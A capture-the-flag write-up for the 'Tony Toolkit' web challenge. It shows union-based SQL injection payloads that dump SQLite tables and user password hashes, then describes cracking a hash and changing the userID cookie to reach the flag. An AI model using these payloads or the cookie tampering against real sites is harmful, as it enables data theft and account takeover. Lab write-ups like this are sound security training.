#### Tony Toolkit
- points earned: 1(Points were reduced on this because it was a stolen challenge.)

#### Where's the flag?
- No src code for this so I'm just looking for the flag.
#### Solution
- The app prompts `What would you like to buy?`
- As part of standard enumeration I tried `'"` to hopefully break up an sql statement and got the error below.
	```
	unrecognized token: ""%';"
	```
	- The presence of `%` in the error makes me think we're in an SQL query.
	- Something like `select thing from table where thing like '%{user_input}%'`
- I tried the following as part of standard enumeration.
	```sql
	XXX%' union select 1,2--
	```
	- the response was
	```
	Name: 1 - Price: $2
	```
	- which means that the SQL query was valid and it is returning 2 fields.
- I then enumerated the db version.
	```sql
	XXX%' union select sqlite_version(),2--
	```
	- this returned the version but more importantly confirmed that its an SQLite db.
- Enumerate tables
	```sql
	XXX%' union select tbl_name,2 from sqlite_master where type='table'--
	```
	- outputs the tables
		- Products
		- Users
		- sqlite_sequence
- Enumerated columns in Users table
	```
	XXX%' union select name,2 from pragma_table_info('Users')--
	```
	- outputs the columns
		- Password
		- UserID
		- Username
- Enumerate Users
	```sql
	XXX%' union select Username,Password from Users--
	```
	- the outputs
		- `Admin:$0000000000000000000000000000000000000000000000000000000000000000`
		- `Jerry:$059a00192592d5444bc0caad7203f98b506332e2cf7abb35d684ea9bf7c18f08`
- Used https://crackstation.net to try and crack Jerry's hash
	- This was successful and it cracked to `1qaz2wsx`
- I am now able to log into the web app as `Jerry:1qaz2wsx`
- Investigated the app with this new level of access but did not find much difference as far as app functionality.
- Couple things I did find curious:
	- The `User` cookie appears to be a sha256 hash.  It does not change each time I log in which means it's using the same string to create the hash.
	- The presence of a `userID` cookie
- I took a couple swings at trying to figure out what was creating the `user` cookie hash without luck.
- Then I tried switching the `userID` cookie to `1` and found the flag on the profile page.
